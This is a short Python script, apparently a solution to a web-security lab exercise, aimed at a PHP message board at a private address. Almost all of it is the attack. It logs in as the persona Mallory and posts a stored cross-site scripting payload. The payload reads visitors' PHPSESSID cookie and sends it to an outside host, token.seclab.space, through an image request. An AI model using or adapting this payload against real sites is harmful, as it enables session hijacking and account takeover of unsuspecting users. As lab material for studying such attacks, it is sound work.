import os, requests
from urllib.parse import urlencode

PROTOCOL = "http"
HOST = "10.0.0.2"
PORT = "80"
BASE = PROTOCOL + "://" + HOST + ":" + PORT

# Mallory's credentials
mallory = {
    'email': 'mallory@example.com',
    'password': 'pass4mallory'
}

# reset the application
requests.get(BASE + '/reset.php')

# #######  your attack goes here  #######
with requests.Session() as s:
    # sign in as mallory
    res = s.post(BASE + '/signin.php', data=mallory)
    # get the cookies
    cookies = {}
    for c in s.cookies:
        cookies[c.name] = c.value
    # get the sessionId from the cookies through JS
    script = '<script>i=document.cookie.indexOf("PHPSESSID=");sessionId=document.cookie.slice(i+1);'
    script += 'var img = new Image(100, 100);img.src="http://token.seclab.space/set.php?sid='
    script += '1003898801'
    script +='&token=" + sessionId</script>'
    res = s.post(BASE + '/post.php', data={'msg': script})

    



# #########################################
